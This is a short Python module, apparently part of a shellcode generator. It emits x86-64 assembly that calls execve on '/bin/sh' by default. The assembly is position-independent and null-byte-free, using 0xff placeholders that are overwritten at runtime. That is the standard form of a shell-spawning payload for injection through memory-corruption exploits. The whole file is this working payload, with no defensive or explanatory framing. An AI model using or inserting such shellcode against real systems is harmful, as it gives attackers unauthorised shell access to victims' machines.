from .ArchModule import Amd64Module


class Module(Amd64Module):
    def __init__(self):
        self.validate_exec_target = self._validate_all
        super().__init__(name='Sys_execve')

    @staticmethod
    def get_data():
        return (
            'addr:\n'
            '    .quad 0xffffffffffffffff\n'
            'addr_eol:\n'
            '    .quad 0xffffffffffffffff\n'
            'sh:\n'
            '    .ascii "{exec_target}"\n'
            'sh_eol:\n'
            '    .byte 0xff\n'
        )

    @staticmethod
    def get_code():
        return (
            # 'execve:\n'
            '    xorq %rax, %rax\n'
            '    movb %al, sh_eol(%rip)\n'
            '    leaq sh(%rip), %rdi\n'
            '    movq %rax, addr_eol(%rip)\n'
            '    movq %rdi, addr(%rip)\n'
            '    leaq addr(%rip), %rsi\n'
            '    xorl %edx, %edx\n'
            '    # sys_execve\n'
            '    movb $59, %al\n'
            '    syscall\n\n'
        )

    @staticmethod
    def param_template():
        return {'exec_target': '/bin/sh'}
